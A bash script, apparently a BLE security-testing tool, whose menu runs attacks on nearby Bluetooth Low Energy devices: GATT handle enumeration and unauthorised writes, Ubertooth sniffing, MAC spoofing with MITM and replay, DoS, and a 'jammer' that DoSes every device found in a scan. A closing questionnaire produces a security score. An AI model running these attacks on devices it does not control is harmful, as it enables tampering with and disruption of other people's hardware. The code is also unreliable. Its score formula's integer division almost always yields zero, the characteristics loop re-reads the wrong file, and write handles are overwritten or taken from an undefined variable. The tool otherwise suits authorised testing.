#!/bin/bash
bash ./banner.sh

r='\033[0;31m'
w='\033[1;37m'
nc='\033[0m'
g='\033[0;32m'

############################################################################################################################################################################

echo -e ${w}

echo "Checking for BLE adapter..."

temp_hci=$(hciconfig | grep 'hci')

echo "----------------------------"

if [[ $temp_hci == hci* ]]
then
  echo -e "\nThe BLE adapter is connected."
else
  echo -e "${r}Please connect the BLE adapter and try again.${w}"
  sleep 3
  for i in {5..1}
  do
    printf "${r}Application will close in $i\r${w}" && sleep 1
  done
  clear
  exit 1
fi

sleep 1


############################################################################################################################################################################

dir=$(pwd)
dir_check=$(ls | grep txtfiles)
if [ -z dir_check ]
then
true
else
rm -rf txtfiles/
fi

mkdir txtfiles

#Initialising values for scoring system


att1_sev=0
att1_comp=0
  
att2_sev=0
att2_comp=5

att3_sev=0
att3_comp=1

att4_sev=0
att4_comp=5

att5_sev=0
att5_comp=1


function ble_scan()
{

cd txtfiles/

sudo hciconfig hci0 reset
sudo hciconfig hci0 down
sudo hciconfig hci0 up
sleep 1
sudo hcitool lescan > tempscan.txt & sleep 2 
#2> /dev/null
echo -e "\n\n"
echo -e "Scanning..."
sleep 1
echo -e "\n."
sleep 1
echo -e "\n."
sleep 1
echo -e "\n."
sleep 1
echo -e "\n\n"
echo -e "Scan completed!"
echo -e "\n\n"
sleep 2
#cat tempscan.txt



#Removing first and last line
sed '1,1d' tempscan.txt > tempscan1.txt
rm tempscan.txt
sed '$d' tempscan1.txt > tempscan.txt
rm tempscan1.txt
sort -u tempscan.txt > devicelist.txt
sort -u tempscan.txt | awk '{print $1}' > address.txt
sudo pkill hcitool 2> /dev/null
cd ..


}

function clean_scanfiles()
{

cd txtfiles
sudo rm tempscan.txt devicelist.txt address.txt
cd ..

}

############################################################################################################################################################################


echo -e "\n"
echo -e "\n"
echo -e "\n"


############################################################################################################################################################################


while true
do


columns=$(tput cols)
att1="[1] Illegal access      ( Write handles )"
att2="[2] Sniffing            ( Value format  )"
att3="[3] Write Values                         "
att4="[4] MITM & Replay attack                 "
att5="[5] Denial of Service                    "
att6="[6] Ble Jammer 1                         "
att7="[7] BLE Jammer 2                         "
att8="[8] Calculate Security score             "
exit="[9] Exit                                 "

printf "%*s\n" $(((${#att1}+$columns)/2)) "$att1"
printf "%*s\n" $(((${#att2}+$columns)/2)) "$att2"
printf "%*s\n" $(((${#att3}+$columns)/2)) "$att3"
printf "%*s\n" $(((${#att4}+$columns)/2)) "$att4"
printf "%*s\n" $(((${#att5}+$columns)/2)) "$att5"
printf "%*s\n" $(((${#att6}+$columns)/2)) "$att6"
printf "%*s\n" $(((${#att7}+$columns)/2)) "$att7"
printf "%*s\n" $(((${#att8}+$columns)/2)) "$att8"
printf "%*s\n" $(((${#exit}+$columns)/2)) "$exit"

echo -e "\n\n"
echo -e -n "Enter your choice [] :  "
read var
sleep 1

if ! [ "$var" -eq "$var" ] 2> /dev/null
then
  echo -e "\n\n"
  echo "Please enter a valid input [1 - 9]"
  echo -e "\n\n"

else

############################################################################################################################################################################

#Illegal Access

if [ $var -eq 1 ]
then

  #Performing BLE scan
  ble_scan

  cd txtfiles/
  cat devicelist.txt
  echo -e "\n\n"


  echo -e -n "Enter the first 3 characters of the device you want to connect with :  "
  read att1_dev
  att1_addr=$(cat tempscan.txt | grep -m 1 $att1_dev | awk '{print $1}')
  echo -e "\nThe address of the selected device is "
  echo $att1_addr

  sudo hciconfig hci0 down
  sudo hciconfig hci0 up

  echo -e "\n\n"

  echo -e "\nListing out all primary\n\n"
  sudo gatttool -b $att1_addr --primary

  echo -e "\n\n"

  echo -e "\nListing out all characteristics\n\n"
  sudo gatttool -b $att1_addr --characteristics

  echo -e "\n\n"

  #Storing the primary in a text file

  sudo gatttool -b $att1_addr --primary > tempprimary.txt & sleep 2 && pkill gatttool 2> /dev/null


  #Storing the characteristics in a text file

  sudo gatttool -b $att1_addr --characteristics > tempcharacteristics.txt & sleep 2 && pkill gatttool 2> /dev/null


  #Creating a file to store all write handles
  touch write_handles.txt



  #Reading all primary handles

  echo -e "\n\n"
  echo -e "Reading all the primary handles"
  echo -e "\n\n"
  for i in $(cat tempprimary.txt); do
    att1_temp_var=$(echo $i | grep -o "0x....")
    if [ -z "$att1_temp_var" ]
    then
      true
    else
      echo -e "\n Handle: $att1_temp_var"
      sudo gatttool -b $att1_addr --char-read -a $att1_temp_var

      att1_equation=$(sudo gatttool -b $att1_addr --char-read -a $att1_temp_var 2>&1)
      att1_check=$(echo $att1_equation | grep -o "Attribute can't be read")
      if [ -z "$att1_check" ]
      then
        true
      else
        echo $att1_temp_var > write_handles.txt
      fi

      echo -e "\n\n"
    fi
  done


  #Reading all characteristics handles

  echo -e "\n\n"
  echo -e "Reading all the characteristics handles"
  echo -e "\n\n"
  for i in $(cat tempprimary.txt); do
    att1_temp_var=$(echo $i | grep -o "0x....")
    if [ -z "$att1_temp_var" ]
    then
      true
    else
      echo -e "\n Handle: $att1_temp_var"
      sudo gatttool -b $att1_addr --char-read -a $att1_temp_var

      att1_equation=$(sudo gatttool -b $att1_addr --char-read -a $att1_temp_var 2>&1)
      att1_check=$(echo $att1_equation | grep -o "Attribute can't be read")
      if [ -z "$att1_check" ]
      then
        true
      else
        echo $temp_var > write_handles.txt
      fi

      echo -e "\n\n"
    fi
  done

  echo -e "${g}"
  if [ -s write_handles.txt ]
  then
    echo -e "\n\n"
    echo -e "The write handles are,\n"
    cat write_handles.txt
    echo -e "\n\n"
    att1_sev=2
  else
    echo -e "\n\n"
    echo -e "No write handles found!!\n"
    echo -e "\n\n"
    att1_sev=5
  fi

  echo -e "${w}"
  

  cd ..

  #clean the scan files
  clean_scanfiles


############################################################################################################################################################################

#Sniffing

elif [ $var -eq 2 ]
then

  att2_check=$(lsusb | grep 'OpenMoko')

  if [[ $att2_check == Bus* ]]
  then

    #Performing BLE scan
    ble_scan

    cd txtfiles/
    cat devicelist.txt
    echo -e "\n"
    echo -e "\n"


    echo -e -n "Enter the first 3 characters of the device you want to connect with :  "
    read att2_dev
    att2_addr=$(cat tempscan.txt | grep -m 1 $att2_dev | awk '{print $1}')
    echo -e "\nThe address of the selected device is "
    echo $att2_addr


    tput sc
    # Change scroll region to exclude first line
    tput csr 1 $((`tput lines` - 1))
    # Move to upper-left corner
    tput cup 0 0
    # Clear to the end of the line
    tput el
    # Create a header row
    echo -e "$(tput setaf 1)$(tput setab 7)Press Ctrl + c to stop sniffing$(tput sgr 0)"
    # Restore cursor position
    tput rc

    sleep 2
    ubertooth-btle -f -t $att2_addr -c sniffed.pcap
    clear
    echo -e "\n\nThe captured file is stored as sniffed.pcap"
    tshark -V -r sniffed.pcap -Y btatt > dummy.txt
    echo -e "${g}"



    if [ -s dummy.txt ]
    then
      echo -e "\n\nThe sniffed values are, \n"
      grep '^    Value' dummy.txt
      echo -e "\n\n"
      att2_sev=1
    
    else
      echo -e "\n\n"
      echo -e "No values found!!\n"
      echo -e "\n\n"
      att2_sev=5
    fi

    
    echo -e "${w}"
    cd ..

    #clean the scan files
    clean_scanfiles

  else

    echo -e "\n\n"
    echo -e "The Ubertooth is not connected !!"

  fi


############################################################################################################################################################################


#Write Values

elif [ $var -eq 3 ]
then

  #Performing BLE scan
  ble_scan

  cd txtfiles/
  cat devicelist.txt
  echo -e "\n"
  echo -e "\n"


  echo -e -n "Enter the first 3 characters of the device you want to connect with :  "
  read att3_dev
  att3_addr=$(cat tempscan.txt | grep -m 1 $att3_dev | awk '{print $1}')

  clear

  echo -e "\n\n"
  echo -e "The write handles are,\n"
  cat write_handles.txt
  echo -e "\n\n"

  echo -e -n "Enter the write handle : "
  read att3_handle

  clear

  echo -e "\n\nThe sniffed values are, \n"
  grep '^    Value' dummy.txt

  echo -e "\n\n"
  echo -e -n "Enter an input value : "
  read att3_value
  echo -e "\n${g}"
  sudo gatttool -i hci0 -b $att3_addr --char-write-req -a $att3_handle -n $att3_value >> att3_check_file.txt
  sudo gatttool -i hci0 -b $att3_addr --char-write-req -a $att3_handle -n $att3_value >> att3_check_file.txt
  sudo gatttool -i hci0 -b $att3_addr --char-write-req -a $att3_handle -n $att3_value >> att3_check_file.txt
  
  att3_check=$(cat att3_check_file.txt | grep "successfully")
  
  if [ -z "$att3_check" ]
  then
    echo -e "\n\n"
    echo -e "Error in writing the characteristic value, Try again :("
    echo -e "\n\n"
    att3_sev=5    
  else
    echo -e "\n\n"
    echo -e "Characteristic value was written successfully"
    echo -e "\n\n"
    att3_sev=0
  fi

  echo -e "${w}"

  cd ..

  #clean the scan files
  clean_scanfiles



############################################################################################################################################################################

elif [ $var -eq 4 ]
then

  clear


  echo -e "\n\n"
  echo -e "${w}Make sure the slave machine is running                     <-------------------"
  echo -e "${w}\nand is in the same network as the host                   <-------------------"
  echo -e "\n\n"

  defaultaddr="00:1a:7d:da:71:13"

  echo -e "${w}Setting default address for BLE adapter"
  cd
  cd $dir/bdaddr/
  make
  sudo ./bdaddr -i hci0 $defaultaddr

  echo -e "\n\n"
  echo -e "$(tput setaf 1)$(tput setab 7)Re-plug the interface and hit enter$(tput sgr 0)"
  read

  cd
  cd node_modules/gattacker

  #for MAC spoofing - device address to the BLE adapter

  cd helpers/bdaddr/
  make
  cd ..
  cd ..

  #modify config.env
  #nano config.env

  echo -e "${w}Capturing advertisement packets"
  echo -e "\n\n"
  echo -e "$(tput setaf 1)$(tput setab 7)Press Ctrl + c to stop sniffing$(tput sgr 0)"
  echo -e "\n\n"

  trap "${w}Terminated!!" SIGINT SIGTERM
  sudo node scan

  echo -e "\n\n${w}"

  cd
  cd $dir

  #Performing BLE scan
  ble_scan

  cd txtfiles/
  cat devicelist.txt
  echo -e "\n"
  echo -e "\n"

  echo -e -n "${w}Enter the first 3 characters of the device you want to connect with :  "
  read att4_dev
  att4_addr=$(cat tempscan.txt | grep -m 1 $att4_dev | awk '{print $1}')
  att4_temp=$(echo "${att4_addr//:}")
  replay_addr=$(echo "${att4_temp,,}")

  cd
  cd node_modules/gattacker/
  echo -e "${w}"
  sudo node scan $replay_addr

  cd devices
  replay_adv=$(ls | grep $replay_addr | grep .adv.json)
  replay_srv=$(ls | grep $replay_addr | grep .srv.json)
  cd ..

  clear

  echo -e "Restart the \"bluetooth\" on the slave machine by typing this in a new terminal (slave machine),"
  echo -e "\n\n"
  echo -e "$(tput setaf 1)$(tput setab 7)sudo systemctl stop bluetooth$(tput sgr 0)"
  echo -e "$(tput setaf 1)$(tput setab 7)sudo systemctl start bluetooth$(tput sgr 0)"
  echo -e "\n\n"
  echo -e -n "$(tput setaf 1)$(tput setab 7)And then press Enter here in the host : $(tput sgr 0)"
  read
  echo -e "\n\n"


  #on raspberry pi - slave - in another terminal
  #sudo systemctl stop bluetooth
  #sudo systemctl start bluetooth

  clear

  echo -e "\n\n"
  #on host
  echo -e -n "$(tput setaf 1)$(tput setab 7)Now restart the whole slave node and press Enter here in the host : $(tput sgr 0)"
  read
  echo -e "\n\n"
  echo -e -n "$(tput setaf 1)$(tput setab 7)When you see <<<<<INITIALIZED>>>>> ,$(tput sgr 0)"
  echo -e "\n\n"
  echo -e -n "${w}Press Ctrl + c                          <---------------------------------"

  echo -e "\n\n"

  sudo systemctl stop bluetooth
  sudo ./mac_adv -a devices/$replay_adv -s devices/$replay_srv

  clear

  echo -e "\n\n"

  echo -e "$(tput setaf 1)$(tput setab 7)Again restart the whole slave node and press Enter here in the host : $(tput sgr 0)"
  read
  echo -e "\n\n"
  echo -e -n "$(tput setaf 1)$(tput setab 7)When you see <<<<<INITIALIZED>>>>> ,"
  echo -e "\n\n"
  echo -e -n "Connect your mobile application with the device and do some valid transactions.$(tput sgr 0)"

  echo -e "\n\n"

  echo -e -n "$(tput setaf 1)$(tput setab 7)Once you are done, Press Ctrl + C to terminate it.$(tput sgr 0)"
  echo -e "\n\n${w}"
  sudo systemctl stop bluetooth
  sudo ./mac_adv -a devices/$replay_adv -s devices/$replay_srv

  clear

  echo -e "\n\n"
  echo -e -n "$(tput setaf 1)$(tput setab 7)For the last time !!  Restart the whole slave node and press Enter here in the host : $(tput sgr 0)"
  read


  echo -e "\n\n${w}"


  cd dump
  att4_mitm_check=$(ls | grep $replay_addr.log)
  cd .. 
  
  if [ -z "$att4_mitm_check" ]
  then
    att4_sev=5
  else
    att4_sev=1
  fi


  read -p "Do you want to change the log file? (y/n) : " log_edit

  if [[ $log_edit == y ]]
  then
    cd dump
    sudo nano $replay_addr.log
    cd ..
    echo -e "\n\n"
    echo -e "Replaying the modified log file"
  else
    echo -e "Replaying the saved log file"
  fi


  echo -e "\n\n"

  sudo node replay.js -i dump/$replay_addr.log -p $replay_addr -s devices/$replay_srv |& tee replay_output.txt

  echo -e "\n\n"
  
  att4_replay_check=$(cat replay_output.txt | grep 'WRITE REQ:')


  if [ -z "$att4_replay_check" ]
  then
    echo -e "\n\n"
    echo -e "${g}Replay attack was NOT successful.${w}"
    echo -e "\n\n"
    att4_sev=5    
  else
    echo -e "\n\n"
    echo -e "${g}Replay attack was successful !!${w}"
    echo -e "\n\n"
    att4_sev=0
  fi


  

  cd devices/
  rm -rf *
  cd ..

  cd dump/
  rm -rf *
  cd ..


  cd
  cd $dir

  echo -e "\n\n"



############################################################################################################################################################################


#DoS Attack

elif [ $var -eq 5 ]
then

  #Performing BLE scan
  ble_scan

  cd txtfiles/
  cat devicelist.txt
  echo -e "\n"
  echo -e "\n"


  echo -e -n "Enter the first 3 characters of the device you want to connect with:  "
  read att5_dev
  att5_addr=$(cat tempscan.txt | grep -m 1 $att5_dev | awk '{print $1}')
  cd ..

  start=`date +%s`
  python test_dos.py $att5_addr
  end=`date +%s`

  runtime=$((end-start))
  echo -e "\n"
  
  if [ $runtime -lt 10 ]
  then
    echo "The DoS attack was terminated in less than 10 seconds"
    att5_sev=5
  else
    echo "The DoS attack was successful (more than 10 seconds)"
    att5_sev=1
  fi

  #clean the scan files
  clean_scanfiles


############################################################################################################################################################################

#BLE Jammer 1
#DoS every available device

elif [ $var -eq 6 ]
then

  #Performing BLE scan
  ble_scan

  cd txtfiles/

  for i in $(cat address.txt)
  do
    gnome-terminal --tab -- python $dir/test_dos.py $i
  done

  echo -e "DoS attack is running on every active device - Check the terminal tabs"

  echo -e "\n\n"
  cd ..

  #clean the scan files
  clean_scanfiles

############################################################################################################################################################################

#BLE Jammer 2

elif [ $var -eq 7 ]
then
  cd txtfiles/
  hciconfig | grep hci | awk '{print $1}' > interfaces.txt
  for line in $(cat interfaces.txt)
  do
  interface=$line
  interface=${interface%?}
  bash advertise.sh $interface
  done
  rm  interfaces.txt
  cd ..

############################################################################################################################################################################


#Security score

#Severity (max 5):
#0. None    -  No loss											#5
#1. Low     -  If recon info on the device is accessible it is of low severity.				#2
#2. Medium  -  If a sensitive information is accessible it is of medium severity.			#1
#3. High    -  If the whole device could be controlled by the attacker it is of high severity.		#0


#Complexity (max 5):
#0. None    -  None required										#0
#1. Low     -  If the attacker needs some pre requisite data or information to perform the attack.	#1
#2. Medium  -  If the attacker requires user's interaction to perform the attack.			#2
#3. High    -  If the attacker requires some specialized hardware to perform the attack.		#5


elif [ $var -eq 8 ]
then
  clear
  echo -e "\n\n"
  echo -e "	+------------------------------+------------------------+-------------------+"
  echo -e "	|	Attacks		       |	Severity	|	Complexity  |"
  echo -e "	+------------------------------+------------------------+-------------------+"
  echo -e "	|	Illegal Access         |        $att1_sev		|	$att1_comp	    |"
  echo -e "	|	Sniffing               |	$att2_sev		|	$att2_comp	    |"
  echo -e "	|	Write Values           |	$att3_sev		|	$att3_comp	    |"
  echo -e "	|	MITM & Replay attack   |	$att4_sev		|	$att4_comp	    |"
  echo -e "	|	Denial of Service      |	$att5_sev		|	$att5_comp	    |"
  echo -e "	+------------------------------+------------------------+-------------------+"
  echo -e "\n\n"

  echo -e "Input 'y' for YES, and 'n' for NO :"
  echo -e "\n\n"

  echo -e "\n1. User Authentication :"
  echo -e "------------------------"
  read -p "Does the device have an Authentication? " q1							#5
  if [[ $q1 == 'y' ]]; then q1=5; else q1=0; fi
  read -p "Is the password strong enough? " q2								#2
  if [[ $q2 == 'y' ]]; then q2=2; else q2=0; fi							
  read -p "Is the device brute force protected? " q3							#2
  if [[ $q3 == 'y' ]]; then q3=2; else q3=0; fi
  read -p "Does the device have multi-factor authentication? " q4					#1
  if [[ $q4 == 'y' ]]; then q4=1; else q4=0; fi

  echo -e "\n2. User Authorization :"
  echo -e "-----------------------"
  read -p "Does the device have access control mechanisms? " q5						#2
  if [[ $q5 == 'y' ]]; then q5=2; else q5=0; fi
  read -p "Does it have white listing for input requests? " q6						#2
  if [[ $q6 == 'y' ]]; then q6=2; else q6=0; fi

  echo -e "\n3. Confidentiality :"
  echo -e "--------------------" 
  read -p "Is the data stored on the device encrypted? " q7						#5
  if [[ $q7 == 'y' ]]; then q7=5; else q7=0; fi
  read -p "Is the communication encrypted / safe? " q8							#2
  if [[ $q8 == 'y' ]]; then q8=2; else q8=0; fi

  echo -e "\n4. Integrity :"
  echo -e "--------------"  
  read -p "Are there any error checking methods? " q9							#1
  if [[ $q9 == 'y' ]]; then q9=1; else q9=0; fi
  read -p "Are there any validation methods (Mutual authentication)? " q10				#5
  if [[ $q10 == 'y' ]]; then q10=5; else q10=0; fi

  echo -e "\n5. Availability :"
  echo -e "-----------------"
  read -p "Is the device resistant to logical tampering? " q11						#2
  if [[ $q11 == 'y' ]]; then q11=2; else q11=0; fi
  read -p "Is the resistant to physical tampering? " q12						#2
  if [[ $q12 == 'y' ]]; then q12=2; else q12=0; fi

  echo -e "\n6. Resilience :"
  echo -e "---------------"
  read -p "Is the device resistant to information leakage (through non-administrative access)? " q13	#2
  if [[ $q13 == 'y' ]]; then q13=2; else q13=0; fi
  read -p "Can the device recover from a DoS attack automatically? " q14				#5
  if [[ $q14 == 'y' ]]; then q14=5; else q14=0; fi

  echo -e "\n7. Accountability :"
  echo -e "-------------------"
  read -p "Is there any logging of data? " q15								#2
  if [[ $q15 == 'y' ]]; then q15=2; else q15=0; fi

  echo -e "\n8. Non - repudiation :"
  echo -e "----------------------"
  read -p "Does the device have digital signature verification (replay attack)? " q16			#2
  if [[ $q16 == 'y' ]]; then q16=2; else q16=0; fi


  sum=$(($att1_sev+$att1_comp+$att2_sev+$att2_comp+$att3_sev+$att3_comp+$att4_sev+$att4_comp+$att5_sev+$att5_comp+$q1+$q2+$q3+$q4+$q5+$q6+$q7+$q8+$q9+$q10+$q11+$q12+$q13+$q14+$q15+$q16))
 
  score=$((($sum/92)*10))
  echo -e "\n\n"
  echo -e "The security score of the device is $score out of 10!!"
  echo -e "\n\n"




############################################################################################################################################################################

#Exit
elif [ $var -eq 9 ]
then
  rm -rf txtfiles/
  pkill python
  for i in {3..1}
    do
      printf "Application will close in $i\r" && sleep 1
    done
    clear
    exit 1

############################################################################################################################################################################

else
  echo -e "\n\n"
  echo -e "Please enter a valid input [ 1 - 9 ]"
  echo -e "\n\n"
fi

fi
############################################################################################################################################################################

done
